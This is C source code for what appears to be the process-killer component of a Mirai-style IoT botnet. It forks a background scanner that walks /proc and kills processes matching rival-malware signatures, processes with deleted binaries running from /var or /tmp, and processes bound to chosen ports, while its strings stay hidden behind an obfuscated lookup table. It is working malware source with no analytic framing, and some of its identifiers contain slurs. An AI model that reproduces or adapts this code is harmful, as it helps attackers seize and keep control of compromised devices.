#define _GNU_SOURCE

#include <stdint.h>
#include <fcntl.h>
#include <stdlib.h>
#include <dirent.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

#include "main.h"
#include "entry.h"
#include "kill.h"

int kill_pid = 0;

static char *read_line(int fd, char *buffer, int buffer_size)
{
    int p = 0;
    int x = 0;

    memset(buffer, 0, buffer_size);

    while(TRUE)
    {
        x = read(fd, buffer + p, 1);

        if(x == 0)
        {
            break;
        }

        if(buffer[p] == '\r' || buffer[p] == '\n')
        {
            break;
        }

        p++;
    }

    if(!x)
    {
        return NULL;
    }

    return buffer;
}

static void d(int val, char *buf, int len, int base)
{
    int s = val;
    int i = 0;
    int x = 0;

    while(TRUE)
    {
        if(!s && i == len)
        {
            break;
        }

        x = s % base;

        s /= base;

        if(x < 10)
        {
            buf[i++] = 48 + x;
            continue;
        }

        buf[i++] = 65 + x - 10;
    }

    buf[i] = 0;

    return;
}

void terminate_process_via_port(uint16_t in)
{
    int fd = -1;
    char buf[256];
    char u[5];
    uint8_t b1, b2, b3, b4;

    fd = open(retrieve_entry_val(PROC_NET_TCP), O_RDONLY);
    if(fd == -1)
    {
        return;
    }

    d(in, u, 4, 16);

    b1 = u[0];
    b2 = u[1];
    b3 = u[2];
    b4 = u[3];

    u[0] = b4;
    u[1] = b3;
    u[2] = b2;
    u[3] = b1;

    while(read_line(fd, buf, sizeof(buf)) != NULL)
    {
 //       printf("readling line..\n");

        int i = 0;
        char tmp[512];
        int s = 0;
        int v = 0;
        char *b;
        char port[512];
        char *c;
        int m = 0;
        int spaces = 0;
        char inode[512];
        int inode_len = 0;
        DIR *proc;
        struct dirent *pid;
        int len = 0;

        while(buf[i] != 0 && buf[i] != ':')
            i++;

        if(!buf[i])
            continue;

        i = i + 2;

        b = buf;

        s = i;

        b = buf + s;
        c = b;

        while(buf[s] != 0 && buf[s] != ' ')
            s++;

        len = s - i;

        memcpy(tmp, b, len);
        tmp[len] = 0;

        while(tmp[v] != 0 && tmp[v] != ':')
            v++;

        b = tmp;

        len = s - i - v - 1;

        memcpy(port, b + v + 1, len);
        port[len] = 0;

        if(strcasestr(port, u))
        {
            DEBUG_PRINT("Found process binded to port %d!\n", in);

            while(TRUE)
            {
                if(!*c)
                {
                    break;
                }

                if(*c != ' ')
                {
                    c++;
                    spaces = 0;
                    continue;
                }

                spaces++;

                if(spaces == TAB)
                {
                    char *kk;

                    kk = c + 3;

                    while(*kk != 0 && *kk != ' ')
                    {
                        kk++;
                        inode_len++;
                    }

                    if(!inode_len)
                    {
                        break;
                    }

                    memcpy(inode, c + 3, inode_len);
                    inode[inode_len] = 0;

                    break;
                }

                m++;
                c++;
            }

            if(inode_len == 0)
            {
                DEBUG_PRINT("Failed to find inode for port %d!\n", in);
                break;
            }

            DEBUG_PRINT("Found inode: %s\n", inode);

            proc = opendir(retrieve_entry_val(PROC));
            if(!proc)
            {
                break;
            }

            while((pid = readdir(proc)) != NULL)
            {
                char fd_buf[4096];
                struct dirent *fd;
                DIR *fd_path;

                if(*(pid->d_name) < '0' || *(pid->d_name) > '9')
                    continue;

                memset(fd_buf, 0, sizeof(fd_buf));

                strcpy(fd_buf, retrieve_entry_val(PROC));
                strcat(fd_buf, pid->d_name);
                strcat(fd_buf, retrieve_entry_val(FD));

                fd_path = opendir(fd_buf);
                if(!fd_path)
                {
                    continue;
                }

                while((fd = readdir(fd_path)) != NULL)
                {
                    char link[4096];
                    char ym[4096];
                    int e = 0;

                    if(*(fd->d_name) < '0' || *(fd->d_name) > '9')
                        continue;

                    strcpy(link, retrieve_entry_val(PROC));
                    strcat(link, pid->d_name);
                    strcat(link, retrieve_entry_val(FD));
                    strcat(link, "/");
                    strcat(link, fd->d_name);

                    e = readlink(link, ym, sizeof(ym) - 1);
                    if(e == -1)
                    {
                        break;
                    }
                    ym[e] = 0;

                    if(strcasestr(ym, inode))
                    {
                        DEBUG_PRINT("Found process PID: %s\n", pid->d_name);
                        kill(atoi(pid->d_name), SIGKILL);
                        DEBUG_PRINT("Sent SIGKILL to PID: %s\n", pid->d_name);
                    }
                }

                closedir(fd_path);
            }

            closedir(proc);
            break;
        }
    }

        close(fd);
    return;
}

static char scan_maps(char *path)
{
    int fd = -1;
    int ret = 0;
    char buf[4096];
    char f = FALSE;

    if((fd = open(path, O_RDONLY)) == -1)
        return f;

    ret = read(fd, buf, sizeof(buf));
    if(ret < 1)
    {
        close(fd);
        return f;
    }

    if(compare_val(buf, ret, retrieve_entry_val(PIZZA_SIG), retrieve_entry_val_len(PIZZA_SIG)) ||
       compare_val(buf, ret, retrieve_entry_val(DONGS_SIG), retrieve_entry_val_len(DONGS_SIG)) ||
       compare_val(buf, ret, retrieve_entry_val(HELPER_SIG), retrieve_entry_val_len(HELPER_SIG)) ||
       compare_val(buf, ret, retrieve_entry_val(SLAVE_SIG), retrieve_entry_val_len(SLAVE_SIG)) ||
       compare_val(buf, ret, retrieve_entry_val(FARTED_SIG), retrieve_entry_val_len(FARTED_SIG)) || 
       compare_val(buf, ret, retrieve_entry_val(LOLFGT_SIG), retrieve_entry_val_len(LOLFGT_SIG)) ||
       compare_val(buf, ret, retrieve_entry_val(WOLF_SIG), retrieve_entry_val_len(WOLF_SIG)))
    {
        f = TRUE;
    }

    close(fd);
    return f;
}

static char scan_comm(char *path)
{
    int fd = -1;
    int ret = 0;
    char buf[4096];
    char f = FALSE;

    if((fd = open(path, O_RDONLY)) == -1)
        return f;

    ret = read(fd, buf, sizeof(buf));
    if(ret < 1)
    {
        close(fd);
        return f;
    }

    /*if(compare_val(buf, ret, "telnetd", 7))
    {
        f = TRUE;
    }*/

    close(fd);
    return f;
}

static char scan_exe(char *path)
{
    int fd = -1;
    int ret = 0;
    char f = FALSE;
    char buf[1024];

    if((fd = open(path, O_RDONLY)) == -1)
        return f;

    while((ret = read(fd, buf, sizeof(buf))) > 0)
    {
        if(compare_val(buf, ret, retrieve_entry_val(TELNETON_SIG), retrieve_entry_val_len(TELNETON_SIG)) ||
           compare_val(buf, ret, retrieve_entry_val(PLSDIE_SIG), retrieve_entry_val_len(PLSDIE_SIG)) || 
           compare_val(buf, ret, retrieve_entry_val(VAR_FILELCK), retrieve_entry_val_len(VAR_FILELCK)) ||
           compare_val(buf, ret, retrieve_entry_val(POST_MIRAI_SIG), retrieve_entry_val_len(POST_MIRAI_SIG)))
        {
            f = TRUE;
            break;
        }
    }

    close(fd);
    return f;
}

static char scan_cwd(char *path, char *exe_buf, char *us, int us_len, int pid)
{
    int fd = -1;
    char buf[4096];
    int len = 0;
    char bad = FALSE;

    len = readlink(path, buf, sizeof(buf) - 1);
    if(len == -1)
    {
        return 0;
    }
    buf[len] = 0;

    // Dont scan ourselves.
    if(pid == getpid() || pid == getppid() || compare_val(buf, len, us, us_len))
    {
        return 0;
    }

    // Suspicious process executed in common path with a deleted or unmapped executable.
    if((compare_val(buf, len, retrieve_entry_val(VAR_TMP), retrieve_entry_val_len(VAR_TMP)) || compare_val(buf, len, retrieve_entry_val(VAR), retrieve_entry_val_len(VAR))) && ((fd = open(exe_buf, O_RDONLY)) == -1))
    {
        bad = TRUE;
    }

    if(fd)
        close(fd);

    return bad;
}

void init_kill(void)
{
    int cur_pid = START_PID;
    char path[4096];
    int len = 0;
    uint32_t last_scan = 0;

    kill_pid = fork();

    if(kill_pid > 0 || kill_pid == -1)
        return;

    last_scan = time(NULL);

    //terminate_process_via_port(9178);
    //terminate_process_via_port(9000);

    len = readlink(retrieve_entry_val(PROC_SELF_EXE), path, 4096 - 1);
    if(len == -1)
    {
        exit(1);
    }
    path[len] = 0;

    DEBUG_PRINT("Detected we are running out of \"%s\"!\n", path);

    sleep(5);

    DEBUG_PRINT("Initialized pid scan!\n");

    // Main loop
    while(TRUE)
    {
        struct dirent *dir;
        DIR *d;

        if(!(d = opendir(retrieve_entry_val(PROC))))
            break;

        while((dir = readdir(d)) != NULL)
        {
            char maps_buf[64];
            int pid = 0;
            int rp_len = 0;
            char rp_buf[64];
            char exe_buf[64];
            char comm_buf[64];
            char cwd_buf[64];

            // We wish to scan pids only
            if(*(dir->d_name) < '0' || *(dir->d_name) > '9')
                continue;

            pid = atoi(dir->d_name);

            if(pid <= cur_pid)
            {
                if(time(NULL) - last_scan > SCAN_RESET_TIME - 1)
                {
                    cur_pid = START_PID;
                    continue;
                }
                continue;
            }

            cur_pid = pid;
            last_scan = time(NULL);

            memset(maps_buf, 0, sizeof(maps_buf));
            memset(exe_buf, 0, sizeof(exe_buf));
            memset(comm_buf, 0, sizeof(comm_buf));
            memset(cwd_buf, 0, sizeof(cwd_buf));

            strcpy(maps_buf, retrieve_entry_val(PROC));
            strcat(maps_buf, dir->d_name);
            strcat(maps_buf, retrieve_entry_val(MAPS));

            strcpy(exe_buf, retrieve_entry_val(PROC));
            strcat(exe_buf, dir->d_name);
            strcat(exe_buf, retrieve_entry_val(EXE));

            strcpy(comm_buf, retrieve_entry_val(PROC));
            strcat(comm_buf, dir->d_name);
            strcat(comm_buf, retrieve_entry_val(COMM));

            strcpy(cwd_buf, retrieve_entry_val(PROC));
            strcat(cwd_buf, dir->d_name);
            strcat(cwd_buf, retrieve_entry_val(CWD));

            // Check if the binary was deleted
            rp_len = readlink(exe_buf, rp_buf, sizeof(rp_buf) - 1);

            if(rp_len != -1)
            {
                int tfd = -1;

                rp_buf[rp_len] = 0;

                // Attempted to PID scan ourselves dont do that.
                if(pid == getpid() || pid == getppid() || compare_val(rp_buf, rp_len, path, len))
                {
                    continue;
                }

                tfd = open(exe_buf, O_RDONLY);
                if(tfd == -1)
                {
                    DEBUG_PRINT("Deleted binary? (%s)\n", exe_buf);
                    kill(pid, SIGKILL);
                }
            }

            if(scan_cwd(cwd_buf, exe_buf, path, len, pid))
            {
                #ifndef DEBUG
                kill(pid, SIGKILL);
                #else
                DEBUG_PRINT("Killing process %s!\n", maps_buf);
                #endif
            }

            if(scan_comm(comm_buf))
            {
                #ifndef DEBUG
                kill(pid, SIGKILL);
                #else
                DEBUG_PRINT("Killing process %s!\n", maps_buf);
                #endif
            }

            if(scan_maps(maps_buf))
            {
                #ifndef DEBUG
                kill(pid, SIGKILL);
                #else
                DEBUG_PRINT("Killing process %s!\n", maps_buf);
                #endif
            }

            if(scan_exe(exe_buf))
            {
                #ifndef DEBUG
                kill(pid, SIGKILL);
                #else
                DEBUG_PRINT("Killing process %s!\n", maps_buf);
                #endif
            }

            sleep(1);
        }

        sleep(1);
        closedir(d);
    }

    DEBUG_PRINT("Scan finished!\n");

    exit(0);
}

void terminate_kill_process(void)
{
    if(kill_pid != 0)
    {
        kill(kill_pid, SIGKILL);
    }

    return;
}
